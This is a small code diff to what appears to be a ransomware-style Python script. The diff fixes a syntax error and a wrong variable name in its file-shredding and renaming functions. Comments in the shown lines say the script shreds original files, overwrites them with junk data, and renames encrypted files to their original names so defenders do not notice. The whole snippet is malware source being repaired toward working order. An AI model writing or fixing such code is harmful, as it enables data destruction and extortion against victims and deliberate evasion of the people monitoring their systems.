@@ -67,7 +67,7 @@ def shred(filelist):
 
 def overwrite(filelist):
     for filename in filelist:
-        os.rename(filename, filename[:-5]
+        os.rename(filename, filename[:-5])
 
 def main():
     print ("="*50)
@@ -85,7 +85,7 @@ def main():
     print ("[DEBUG] [+] List of encrypted files\n", encrypted_files)
 
     # Removing + Overwriting with junk data = Shredding... 
-    shred(target_file)
+    shred(target_files)
 
     # Renaming all the encrypted files to original file name, 
     # So the blue teams would not notice... 
